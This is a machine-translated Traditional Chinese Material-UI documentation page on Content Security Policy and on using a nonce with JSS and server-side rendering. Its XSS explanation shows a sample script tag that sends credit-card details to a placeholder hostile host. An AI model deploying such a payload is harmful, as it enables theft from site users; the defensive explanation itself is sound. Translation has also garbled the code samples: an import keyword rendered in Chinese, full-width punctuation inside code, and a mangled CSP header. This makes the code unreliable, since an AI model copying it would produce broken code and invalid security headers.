# 內容安全政策（CSP）

<p class="description">Material-UI支持內容安全策略標頭。</p>

## 什麼是CSP，為什麼它有用？

基本上，CSP通過要求開發人員將其資產從中檢索的源列入白名單來緩解跨站點腳本（XSS）攻擊。 此列表作為服務器的標頭返回。 例如，假設您有一個託管在 `https://example.com` 的網站，CSP標頭 `默認為-src：'self';` 將允許位於 `https://example.com/*` 所有資產並拒絕所有其他資產。 如果您的網站的某個部分容易受到XSS的影響而未顯示未轉義的用戶輸入，則攻擊者可以輸入以下內容：

    <script>
      sendCreditCardDetails（'https：//hostile.example'）;
    </script>
    

此漏洞允許攻擊者執行任何操作。 但是，使用安全的CSP標頭，瀏覽器將不會加載此腳本。

你可以閱讀更多關於CSP [這裡](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)。

## 如何實現CSP？

為了將CSP與Material-UI（和JSS）一起使用，您需要使用nonce。 隨機數是一個隨機生成的字符串，僅使用一次，因此您需要添加服務器中間件以在每個請求上生成一個。 JSS有 [偉大的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md) 如何用快遞來實現這一點，並作出反應頭盔。 對於基本綱要，請繼續閱讀。

CSP nonce是Base 64編碼的字符串。 你可以這樣生成一個：

```js
從'uuid / v4'導入uuidv4;

const nonce = new Buffer（uuidv4（））。toString（'base64'）;
```

使用UUID版本4非常重要，因為它會生成 **不可預測的** 字符串。 然後，將此nonce應用於CSP標頭。 應用了隨機數時，CSP標頭可能如下所示：

```js
header（'Content-Security-Policy'）
  .set（`default-src'self'; style-src：'self''nonce-${nonce}';`）;
```

如果使用服務器端呈現（SSR），則應在服務器上的 `<style>` 標記中傳遞隨機數。

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

然後，您必須將此隨機數傳遞給JSS，以便將其添加到後續的 `<style>` 標記中。 客戶端從頭部獲取nonce。 無論是否使用SSR，都必須包含此標頭。

```jsx
<meta property="csp-nonce" content={nonce} />
```